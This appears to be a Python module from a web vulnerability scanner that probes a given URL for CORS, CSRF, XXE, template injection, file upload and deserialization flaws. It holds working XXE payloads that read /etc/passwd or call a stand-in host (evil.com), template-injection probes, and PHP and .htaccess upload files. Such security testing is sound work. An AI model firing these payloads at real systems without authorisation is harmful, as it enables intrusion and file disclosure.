"""
Advanced Attacks Module
CORS, CSRF, XXE, SSTI, File Upload, Deserialization testing.
"""

import re
import json
import time
import urllib.parse
import requests
from pathlib import Path
from datetime import datetime


class AdvancedAttacks:
    """Advanced attack vector testing."""

    def __init__(self, target_url, scan_dir=None):
        """Initialize advanced attacks scanner."""
        self.target_url = target_url.rstrip('/')
        self.scan_dir = Path(scan_dir) if scan_dir else None
        self.findings = []
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.stats = {
            'tests_run': 0,
            'vulnerabilities_found': 0,
        }

    def _add_finding(self, severity, title, description, evidence=None, remediation=None, category='advanced'):
        """Add a finding."""
        self.findings.append({
            'id': f"adv-{len(self.findings) + 1}",
            'category': category,
            'severity': severity,
            'title': title,
            'description': description,
            'evidence': evidence,
            'remediation': remediation,
            'timestamp': datetime.now().isoformat(),
        })
        self.stats['vulnerabilities_found'] += 1

    # ================================================================
    # CORS EXPLOITATION
    # ================================================================

    def test_cors(self):
        """Test CORS misconfiguration."""
        print("  [CORS] Testing CORS configuration...")
        
        test_origins = [
            'https://evil.com',
            'https://attacker.com',
            'null',
            self.target_url.replace('https://', 'http://'),
        ]
        
        for origin in test_origins:
            try:
                headers = {'Origin': origin}
                r = self.session.get(self.target_url, headers=headers, timeout=10)
                
                acao = r.headers.get('Access-Control-Allow-Origin', '')
                acac = r.headers.get('Access-Control-Allow-Credentials', '')
                
                if acao == '*' or acao == origin:
                    if acac.lower() == 'true':
                        self._add_finding(
                            severity='critical',
                            title='CORS Misconfiguration (Credentials)',
                            description=f'Server reflects origin with credentials enabled.',
                            evidence=f'Origin: {origin}\nACAO: {acao}\nACAC: {acac}',
                            remediation='Restrict CORS to trusted origins only.',
                            category='cors'
                        )
                        return
                    elif acao == '*':
                        self._add_finding(
                            severity='high',
                            title='CORS Wildcard',
                            description='Server allows any origin via wildcard (*).',
                            evidence=f'Access-Control-Allow-Origin: {acao}',
                            remediation='Restrict CORS to specific trusted origins.',
                            category='cors'
                        )
                        return
                
            except Exception:
                continue
        
        self._add_finding(
            severity='info',
            title='CORS Configuration OK',
            description='No CORS misconfiguration detected.',
            evidence='CORS headers properly configured',
            remediation='Continue monitoring CORS configuration.',
            category='cors'
        )
        
        self.stats['tests_run'] += 1

    # ================================================================
    # CSRF TESTING
    # ================================================================

    def test_csrf(self):
        """Test for CSRF vulnerabilities."""
        print("  [CSRF] Testing CSRF protection...")
        
        # Check for CSRF token in forms
        try:
            r = self.session.get(self.target_url, timeout=10)
            
            # Find all forms
            forms = re.findall(r'<form[^>]*>(.*?)</form>', r.text, re.DOTALL | re.IGNORECASE)
            
            csrf_protected = 0
            csrf_unprotected = 0
            
            for form in forms:
                # Check for CSRF tokens
                if re.search(r'csrf|token|_token|csrfmiddlewaretoken', form, re.IGNORECASE):
                    csrf_protected += 1
                else:
                    csrf_unprotected += 1
            
            if csrf_unprotected > 0 and csrf_protected == 0:
                self._add_finding(
                    severity='high',
                    title='No CSRF Protection',
                    description=f'Found {csrf_unprotected} forms without CSRF tokens.',
                    evidence=f'Forms without CSRF: {csrf_unprotected}',
                    remediation='Add CSRF tokens to all state-changing forms.',
                    category='csrf'
                )
            elif csrf_unprotected > 0:
                self._add_finding(
                    severity='medium',
                    title='Partial CSRF Protection',
                    description=f'{csrf_protected} forms protected, {csrf_unprotected} unprotected.',
                    evidence=f'Protected: {csrf_protected}, Unprotected: {csrf_unprotected}',
                    remediation='Add CSRF tokens to all forms.',
                    category='csrf'
                )
            
        except Exception:
            pass
        
        self.stats['tests_run'] += 1

    # ================================================================
    # XXE INJECTION
    # ================================================================

    def test_xxe(self):
        """Test for XXE vulnerabilities."""
        print("  [XXE] Testing XML External Entity...")
        
        xxe_payloads = [
            # Basic XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            # Parameter XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
            # Blind XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><root>&xxe;</root>',
        ]
        
        xml_endpoints = ['/api', '/api/xml', '/xml', '/upload', '/import', '/feed', '/rss', '/sitemap']
        
        for endpoint in xml_endpoints:
            for payload in xxe_payloads:
                try:
                    r = self.session.post(
                        self.target_url + endpoint,
                        data=payload,
                        headers={'Content-Type': 'application/xml'},
                        timeout=10
                    )
                    
                    # Check for file contents in response
                    if 'root:' in r.text or 'hostname' in r.text:
                        self._add_finding(
                            severity='critical',
                            title=f'XXE Vulnerability at {endpoint}',
                            description='Server vulnerable to XXE attack. Can read local files.',
                            evidence=f'Endpoint: {endpoint}\nPayload worked',
                            remediation='Disable external entity processing in XML parser.',
                            category='xxe'
                        )
                        return
                    
                except Exception:
                    continue
        
        self.stats['tests_run'] += 1

    # ================================================================
    # SSTI (SERVER-SIDE TEMPLATE INJECTION)
    # ================================================================

    def test_ssti(self):
        """Test for Server-Side Template Injection."""
        print("  [SSTI] Testing Template Injection...")
        
        ssti_payloads = [
            ('{{7*7}}', '49', 'Jinja2/Twig'),
            ('${7*7}', '49', 'FreeMarker/Velocity'),
            ('<%= 7*7 %>', '49', 'ERB'),
            ('#{7*7}', '49', 'Ruby'),
            ('{{config}}', 'Config', 'Jinja2'),
            ('{{self.__class__.__mro__}}', 'MRO', 'Python'),
        ]
        
        ssti_endpoints = ['/', '/search', '/name', '/template', '/render', '/page']
        
        for endpoint in ssti_endpoints:
            for payload, expected, template_type in ssti_payloads:
                try:
                    # GET injection
                    r = self.session.get(
                        f"{self.target_url}{endpoint}?name={urllib.parse.quote(payload)}",
                        timeout=10
                    )
                    
                    if expected in r.text and expected != payload:
                        self._add_finding(
                            severity='critical',
                            title=f'SSTI Vulnerability ({template_type})',
                            description=f'Server vulnerable to {template_type} template injection.',
                            evidence=f'Endpoint: {endpoint}\nPayload: {payload}\nExpected: {expected}',
                            remediation='Avoid rendering user input in templates.',
                            category='ssti'
                        )
                        return
                    
                    # POST injection
                    r = self.session.post(
                        self.target_url + endpoint,
                        json={'name': payload},
                        timeout=10
                    )
                    
                    if expected in r.text and expected != payload:
                        self._add_finding(
                            severity='critical',
                            title=f'SSTI Vulnerability ({template_type})',
                            description=f'Server vulnerable to {template_type} template injection.',
                            evidence=f'Endpoint: {endpoint}\nPayload: {payload}',
                            remediation='Avoid rendering user input in templates.',
                            category='ssti'
                        )
                        return
                    
                except Exception:
                    continue
        
        self.stats['tests_run'] += 1

    # ================================================================
    # FILE UPLOAD EXPLOIT
    # ================================================================

    def test_file_upload(self):
        """Test file upload vulnerabilities."""
        print("  [UPLOAD] Testing file upload...")
        
        upload_endpoints = ['/upload', '/api/upload', '/file/upload', '/attachments', '/import']
        
        # Test files
        test_files = {
            'test.php': '<?php echo "VULN"; ?>',
            'test.php5': '<?php echo "VULN"; ?>',
            'test.phtml': '<?php echo "VULN"; ?>',
            'test.jpg.php': '<?php echo "VULN"; ?>',
            'test.php.jpg': '<?php echo "VULN"; ?>',
            '.htaccess': 'AddType application/x-httpd-php .jpg',
        }
        
        for endpoint in upload_endpoints:
            for filename, content in test_files.items():
                try:
                    files = {'file': (filename, content, 'application/octet-stream')}
                    r = self.session.post(
                        self.target_url + endpoint,
                        files=files,
                        timeout=10
                    )
                    
                    if r.status_code in (200, 201):
                        self._add_finding(
                            severity='critical',
                            title=f'Unrestricted File Upload at {endpoint}',
                            description=f'Server accepts executable files: {filename}',
                            evidence=f'Endpoint: {endpoint}\nFile: {filename}\nStatus: {r.status_code}',
                            remediation='Restrict allowed file types. Store uploads outside web root.',
                            category='upload'
                        )
                        return
                    
                except Exception:
                    continue
        
        self.stats['tests_run'] += 1

    # ================================================================
    # INSECURE DESERIALIZATION
    # ================================================================

    def test_deserialization(self):
        """Test for insecure deserialization."""
        print("  [DESER] Testing deserialization...")
        
        # PHP object injection
        php_payloads = [
            'O:8:"stdClass":0:{}',
            'a:1:{s:1:"a";s:1:"1";}',
        ]
        
        # Java serialized object (base64)
        java_payload = 'rO0ABXNyABNqYXZhLnV0aWwuSGFzaE1hcAUH'  # Partial
        
        endpoints = ['/api', '/import', '/load', '/unserialize', '/api/data']
        
        for endpoint in endpoints:
            for payload in php_payloads:
                try:
                    r = self.session.post(
                        self.target_url + endpoint,
                        data=payload,
                        headers={'Content-Type': 'application/x-php-serialized'},
                        timeout=10
                    )
                    
                    if r.status_code == 200 and 'error' not in r.text.lower():
                        self._add_finding(
                            severity='critical',
                            title=f'Deserialization Vulnerability at {endpoint}',
                            description='Server accepts serialized PHP objects.',
                            evidence=f'Endpoint: {endpoint}\nPayload accepted',
                            remediation='Avoid deserializing untrusted data.',
                            category='deserialization'
                        )
                        return
                    
                except Exception:
                    continue
        
        self.stats['tests_run'] += 1

    # ================================================================
    # MAIN SCAN
    # ================================================================

    def scan(self):
        """Run all advanced attack tests."""
        print(f"\n{'='*60}")
        print(f"ADVANCED ATTACKS SCANNER")
        print(f"{'='*60}")
        print(f"Target: {self.target_url}")
        print(f"{'='*60}\n")
        
        # Run all tests
        self.test_cors()
        self.test_csrf()
        self.test_xxe()
        self.test_ssti()
        self.test_file_upload()
        self.test_deserialization()
        
        print(f"\n{'='*60}")
        print(f"ADVANCED ATTACKS COMPLETE")
        print(f"{'='*60}")
        
        return {
            'findings': self.findings,
            'stats': self.stats,
        }


def scan_advanced(target_url, scan_dir=None):
    """Convenience function for advanced attacks."""
    scanner = AdvancedAttacks(target_url, scan_dir)
    return scanner.scan()


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python advanced_attacks.py <url>")
        sys.exit(1)
    result = scan_advanced(sys.argv[1])
    print(f"\nVulnerabilities found: {result['stats']['vulnerabilities_found']}")